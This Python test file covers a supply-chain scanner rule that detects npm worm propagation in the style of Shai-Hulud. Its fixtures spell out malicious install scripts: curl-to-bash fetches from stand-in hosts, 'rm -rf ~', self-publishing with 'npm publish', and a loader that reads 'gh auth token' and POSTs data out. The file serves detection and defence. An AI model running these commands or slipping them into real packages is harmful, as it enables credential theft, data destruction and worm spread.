"""Tests for L2-WORM-001: Worm propagation detection."""

import tempfile
import unittest
from pathlib import Path

from picosentry.scan.rules.worm_propagation import detect_worm_propagation

from tests.scan.conftest import make_npm_project as _make_project


class TestWormPropagationPostInstall(unittest.TestCase):
    """Test worm propagation patterns in postinstall scripts."""

    def test_curl_pipe_bash(self):
        """Detect curl|bash in postinstall — Shai-Hulud v1 pattern."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "curl http://shai-hulud.cc/payload.sh | bash"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)
            messages = [f.message for f in worm_findings]
            self.assertTrue(
                any("pipe" in m.lower() or "remote" in m.lower() or "download" in m.lower() for m in messages),
                f"Expected remote pipe pattern, got: {messages}",
            )

    def test_npm_publish_in_postinstall(self):
        """Detect npm publish in postinstall — worm self-propagation."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {"postinstall": "npm whoami && npm publish --access public"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)
            messages = [f.message for f in worm_findings]
            self.assertTrue(
                any("npm" in m.lower() and "publish" in m.lower() for m in messages),
                f"Expected npm publish pattern, got: {messages}",
            )

    def test_node_eval_oneliner(self):
        """Detect node -e one-liners in postinstall."""
        node_payload = 'node -e \'var r=require("child_process");r.execSync("curl http://evil.cc/p | bash")\''
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "test-pkg",
                    "version": "1.0.0",
                    "scripts": {
                        "postinstall": node_payload,
                    },
                },
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)

    def test_bun_payload_reference(self):
        """Detect Shai-Hulud 2.0 Bun payload references."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path, {"name": "test-pkg", "version": "1.0.0", "scripts": {"preinstall": "node bun_environment.js"}}
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)
            bun_findings = [f for f in worm_findings if "Bun" in f.message or "bun" in f.message.lower()]
            self.assertGreater(
                len(bun_findings),
                0,
                f"Expected Bun payload detection, got: {[f.message for f in worm_findings]}",
            )

    def test_destructive_fallback(self):
        """Detect rm -rf ~ / $HOME in scripts — Shai-Hulud 2.0 destructive fallback."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(tmp_path, {"name": "test-pkg", "version": "1.0.0", "scripts": {"postinstall": "rm -rf ~"}})
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)
            destructive = [
                f for f in worm_findings if "destructive" in f.message.lower() or "wipe" in f.message.lower()
            ]
            self.assertGreater(len(destructive), 0)

    def test_shai_hulud_campaign_identifier(self):
        """Detect MUT-8694 campaign identifier in source code."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {"name": "test-pkg", "version": "1.0.0"},
                files={"index.js": "// Campaign: MUT-8694\nconst x = 1;"},
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)

    def test_git_config_manipulation(self):
        """Detect git config --unset core.bare — repository hijacking."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {"name": "test-pkg", "version": "1.0.0", "scripts": {"postinstall": "git config --unset core.bare"}},
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)

    def test_clean_package_no_findings(self):
        """Clean package should produce no worm findings."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path, {"name": "clean-pkg", "version": "1.0.0", "scripts": {"build": "tsc", "test": "jest"}}
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertEqual(len(worm_findings), 0)


class TestWormPropagationSourceScan(unittest.TestCase):
    """Test worm propagation patterns in JS source files."""

    def test_write_filesync_package_json(self):
        """Detect writeFileSync(package.json) — self-modifying package."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {"name": "test-pkg", "version": "1.0.0"},
                files={"index.js": "const fs = require('fs'); fs.writeFileSync('package.json', data);"},
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)

    def test_glob_scan_node_modules(self):
        """Detect glob scanning of node_modules — worm propagation target."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {"name": "test-pkg", "version": "1.0.0"},
                files={"propagate.js": "const glob = require('glob');\nglob.sync('node_modules/*/package.json');"},
            )
            findings = detect_worm_propagation(tmp_path)
            worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm_findings), 0)


class TestMiniShaiHuludTanStack(unittest.TestCase):
    """Test detection of the Mini Shai-Hulud / TeamPCP TanStack variant (May 2026).

    These cover the *structural* mechanics that defeated SLSA provenance:
    Bun execution evasion, git-dependency delivery, and silent-fail-after-exec.
    They must fire WITHOUT relying on the `rm -rf $HOME` dead-man switch, which
    the V3.0 variant removed.
    """

    def test_bun_run_in_prepare_script(self):
        """Detect `bun run <file>` in a prepare script — Bun evasion pattern."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "@uipath/setup",
                    "version": "0.0.1",
                    "scripts": {"prepare": "bun run router_init.js && exit 1"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            msgs = [f.message for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertTrue(any("Bun runtime execution" in m for m in msgs), msgs)

    def test_silent_fail_after_exec(self):
        """Detect `&& exit 1` trailing a payload run — hides install from output."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "scripts": {"preinstall": "bun run loader.js && exit 1"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            msgs = [f.message for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertTrue(any("Forced exit" in m for m in msgs), msgs)

    def test_git_dep_plus_lifecycle_is_critical(self):
        """Git-resolved dep + install lifecycle script in one manifest -> CRITICAL."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "evil",
                    "version": "1.0.0",
                    "optionalDependencies": {"x": "github:attacker/x#abc"},
                    "scripts": {"preinstall": "node setup.js"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            crit = [
                f
                for f in findings
                if f.rule_id == "L2-WORM-001" and f.severity.value == "CRITICAL" and "delivery pattern" in f.message
            ]
            self.assertGreater(len(crit), 0, [f.message for f in findings if f.rule_id == "L2-WORM-001"])

    def test_v3_variant_without_deadman_switch_still_flagged(self):
        """V3.0-style package (no rm -rf, renamed loader) must still be caught."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "@uipath/setup",
                    "version": "0.0.1",
                    "scripts": {"prepare": "bun run router_init.js && exit 1"},
                },
                files={
                    "router_init.js": (
                        "const t = execSync('gh auth token').toString();\n"
                        "const blob = Bun.gunzipSync(payload);\n"
                        "fetch('https://otel.example/v1/traces', {method:'POST', body:blob});\n"
                    ),
                },
            )
            findings = detect_worm_propagation(tmp_path)
            worm = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertGreater(len(worm), 0)

    def test_benign_git_dep_without_script_is_not_critical(self):
        """A git dep with NO lifecycle script must not be CRITICAL (false-positive guard)."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "uses-fork",
                    "version": "1.0.0",
                    "dependencies": {"lib": "git+https://github.com/me/lib.git#v2"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            crit = [f for f in findings if f.rule_id == "L2-WORM-001" and f.severity.value == "CRITICAL"]
            self.assertEqual(len(crit), 0, [f.message for f in findings])

    def test_husky_prepare_is_clean(self):
        """`husky install` in prepare is benign and must produce no findings."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "normal-app",
                    "version": "1.0.0",
                    "scripts": {"prepare": "husky install"},
                },
            )
            findings = detect_worm_propagation(tmp_path)
            worm = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertEqual(len(worm), 0, [f.message for f in worm])

    def test_benign_bun_app_is_clean(self):
        """Common Bun APIs (Bun.file, Bun.spawnSync) in app code are not flagged."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "bun-app",
                    "version": "1.0.0",
                    "scripts": {"start": "bun run server.js"},
                },
                files={
                    "server.js": (
                        'const d = await Bun.file("config.json").text();\nconst p = Bun.spawnSync(["ls"]);\n'
                    ),
                },
            )
            findings = detect_worm_propagation(tmp_path)
            worm = [f for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertEqual(len(worm), 0, [f.message for f in worm])

    def test_bun_gunzip_payload_is_flagged(self):
        """Bun.gunzipSync (payload-unpacking trait) IS flagged."""
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            _make_project(
                tmp_path,
                {
                    "name": "evil",
                    "version": "1.0.0",
                },
                files={"loader.js": "const blob = Bun.gunzipSync(payload);\n"},
            )
            findings = detect_worm_propagation(tmp_path)
            msgs = [f.message for f in findings if f.rule_id == "L2-WORM-001"]
            self.assertTrue(any("Bun-only runtime API" in m for m in msgs), msgs)


if __name__ == "__main__":
    unittest.main()
